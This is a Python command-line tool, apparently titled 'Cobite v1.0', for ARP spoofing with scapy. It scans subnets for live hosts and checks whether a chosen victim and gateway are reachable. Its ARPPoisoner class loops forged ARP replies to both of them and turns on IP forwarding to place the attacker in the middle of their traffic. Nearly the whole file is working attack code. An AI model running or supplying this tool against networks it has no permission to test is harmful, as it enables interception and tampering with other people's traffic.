#!/usr/bin/env python3

import sys
import time
import os
import logging
from termcolor import colored, cprint

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, Ether, srp, send, conf, get_if_list, get_if_addr

show_version = "Cobite v1.0 | Made By Nihil7."


def print_help_menu():
    banner = r"""
                      ___.   .__  __                    
            ____  ____\_ |__ |__|/  |_  ____            
  ______  _/ ___\/  _ \| __ \|  \   __\/ __ \    ______ 
 /_____/  \  \__(  <_> ) \_\ |  ||  | \  ___/   /_____/ 
           \___  >____/|___  /__||__|  \___  >          
               \/          \/              \/            
"""
    cprint(banner, 'yellow', attrs=['bold'])
    print(colored("GitHub:", 'cyan') + " github.com/7nihil")
    print(colored("Contact:", 'cyan') + " nihil7sec@gmail.com")
    print()
    cprint("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 'yellow')
    print(colored("\nUsage: cobite [OPTIONS]", 'yellow'))
    print(colored("\nOptions:", 'yellow'))
    print(f"  {colored('-s, --scan', 'yellow'):<25} Scan Network Range (e.g., 10.0.2.0/24)")
    print(f"  {colored('-t, --target', 'yellow'):<25} Set Target IP (Victim).")
    print(f"  {colored('-g, --gateway', 'yellow'):<25} Set Gateway IP (Router).")
    print(f"  {colored('-i, --interface', 'yellow'):<25} List Available Network Interfaces.")
    print(f"  {colored('-c, --check', 'yellow'):<25} Only check targets, No Poisoning.")
    print(f"  {colored('-h, --help', 'yellow'):<25} Show this help message.")
    print(f"  {colored('-v, --version', 'yellow'):<25} Show version.")
    print()



def network_scanner(ip_range):
    cprint(f"[*] SCANNING NETWORK: {ip_range}", "cyan", attrs=["bold"])
    print(colored("-" * 45, 'white'))

    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    print(colored(f"{'IP ADDRESS':<20}{'MAC ADDRESS':<20}", 'yellow', attrs=['bold']))
    for element in answered_list:
        print(f"{element[1].psrc:<20}{element[1].hwsrc:<20}")

    print(colored("-" * 45, 'white'))
    cprint(f"[+] Scan completed. {len(answered_list)} hosts found.", "green")


def list_interfaces():
    print()
    cprint("[*] DISCOVERING NETWORK INTERFACES...", "cyan", attrs=["bold"])
    print()

    header = f"{'ID':<7}{'INTERFACE':<18}{'IP ADDRESS':<20}"
    print(colored(header, 'yellow', attrs=['bold']))
    print(colored("-" * 45, 'white'))

    interfaces = get_if_list()
    for i, iface in enumerate(interfaces):
        try:
            ip = get_if_addr(iface)
            if ip == "0.0.0.0": ip = "No IP Assigned"
        except:
            ip = "Disconnected"

        idx_str = colored(str(i), 'magenta')
        iface_str = colored(iface, 'white', attrs=['bold'])

        print(f"{idx_str:<16} {iface_str:<30} {ip:<20}")
    print()


def run_dry_check(target_ip, gateway_ip, interface):
    cprint(f"[*] RECON MODE: Investigating Network Environment...", "cyan", attrs=["bold"])
    if os.getuid() != 0:
        cprint("[!] FAILED: sudo required.", "red", attrs=["bold"])
        return False

    conf.iface = interface
    print(f"[{colored('+', 'green')}] Privileges: " + colored("ROOT", "white", attrs=["bold"]))
    print(f"[{colored('+', 'green')}] Interface:  " + colored(interface, "white", attrs=["bold"]))

    def get_mac_silent(ip):
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)[0]
        return ans[0][1].hwsrc if ans else None

    print(colored("[*]", "cyan") + " Sending ARP Probes...")
    t_mac = get_mac_silent(target_ip)
    g_mac = get_mac_silent(gateway_ip)

    t_status = colored(f"ONLINE ({t_mac})", "green", attrs=["bold"]) if t_mac else colored("OFFLINE", "red")
    g_status = colored(f"ONLINE ({g_mac})", "green", attrs=["bold"]) if g_mac else colored("OFFLINE", "red")

    print(f"[{colored('+', 'green')}] Target  ({target_ip}): {t_status}")
    print(f"[{colored('+', 'green')}] Gateway ({gateway_ip}): {g_status}")

    if t_mac and g_mac:
        print()
        cprint(">> ATTACK VECTOR IS READY.", "green", attrs=["bold", "blink"])
    else:
        print()
        cprint(">> ATTACK VECTOR IS STALLED.", "red", attrs=["bold"])


class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        conf.verb = 0

    def get_mac(self, ip):
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)[0]
        return ans[0][1].hwsrc if ans else None

    def start_poisoning(self):
        print(colored("[*]", "cyan") + " Resolving MAC addresses...")
        t_mac = self.get_mac(self.target_ip)
        g_mac = self.get_mac(self.gateway_ip)

        if not t_mac or not g_mac:
            cprint("[!] CRITICAL: Target discovery failed.", "red", attrs=["bold"])
            return

        cprint(f"[*] ENGAGED: {self.target_ip} is under control.", "green")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

        packets = 0
        try:
            print()
            while True:
                send(ARP(op=2, pdst=self.target_ip, hwdst=t_mac, psrc=self.gateway_ip), verbose=False)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=g_mac, psrc=self.target_ip), verbose=False)
                packets += 2
                sys.stdout.write(
                    f"\r{colored('[!]', 'red', attrs=['bold'])} Poisoning Active | {colored('Packets:', 'white')} {colored(str(packets), 'magenta', attrs=['bold'])} | {colored('Target:', 'white')} {colored(self.target_ip, 'cyan')}")
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n\n" + colored("[*]", "yellow") + " Cleaning up...")
            send(ARP(op=2, pdst=self.target_ip, hwdst=t_mac, psrc=self.gateway_ip, hwsrc=g_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=g_mac, psrc=self.target_ip, hwsrc=t_mac), count=5, verbose=False)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
            cprint("[+] Goodbye.", "green", attrs=["bold"])


def main():
    args = sys.argv
    if len(args) == 1 or '-h' in args or '--help' in args:
        print_help_menu()
        return

    if '-v' in args or '--version' in args:
        print()
        print(colored(f"{show_version}", "cyan"))
        return

    if '-i' in args:
        list_interfaces()
        return

    if '-s' in args or '--scan' in args:
        try:
            target_range = args[args.index('-s') + 1] if '-s' in args else args[args.index('--scan') + 1]
            network_scanner(target_range)
        except IndexError:
            cprint("[!] Error: Please specify a range. Example: -s 10.0.2.0/24", "red")
        return

    if '-t' in args and '-g' in args:
        t_ip = args[args.index('-t') + 1]
        g_ip = args[args.index('-g') + 1]
        iface = conf.iface

        if '-c' in args:
            run_dry_check(t_ip, g_ip, iface)
        else:
            poisoner = ARPPoisoner(t_ip, g_ip, iface)
            poisoner.start_poisoning()
    else:
        cprint("[!] Error: Missing parameters. Use -h.", "red")


if __name__ == "__main__":
    main()